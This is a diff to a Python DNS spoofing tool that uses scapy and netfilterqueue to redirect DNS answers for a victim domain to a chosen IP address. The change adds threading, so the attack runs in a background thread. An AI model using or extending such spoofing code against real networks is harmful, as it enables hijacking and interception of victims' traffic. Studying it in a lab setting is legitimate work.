@@ -2,6 +2,7 @@ from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, TCP
 import argparse
 import netfilterqueue
 import os
+import threading
 
 def dns_response(pkt, interface, redirected_ip, victim_domain=None, verbose=False):
     packet = IP(pkt.get_payload())
@@ -35,6 +36,10 @@ def dns_response(pkt, interface, redirected_ip, victim_domain=None, verbose=Fals
     
     if packet.haslayer(DNSRR) and verbose:
         print("Packet forwarded\n")
+
+def dns_attack_thread(interface, redirected_ip, victim_domain, verbose):
+    send_thread = threading.Thread(target=dns_attack, args=(interface, redirected_ip, victim_domain, verbose))
+    send_thread.start()
 
 def dns_attack(interface, redirected_ip, victim_domain=None, verbose=False):
     print('DNS attack running...')
@@ -78,4 +83,6 @@ if __name__ == '__main__':
     victim_domain = args.victim_domain
     verbose = args.verbose
 
-    dns_attack(interface, redirected_ip, victim_domain, verbose)
+    #dns_attack(interface, redirected_ip, victim_domain, verbose)
+    send_thread = threading.Thread(target=dns_attack, args=(interface, redirected_ip, victim_domain, verbose))
+    send_thread.start()
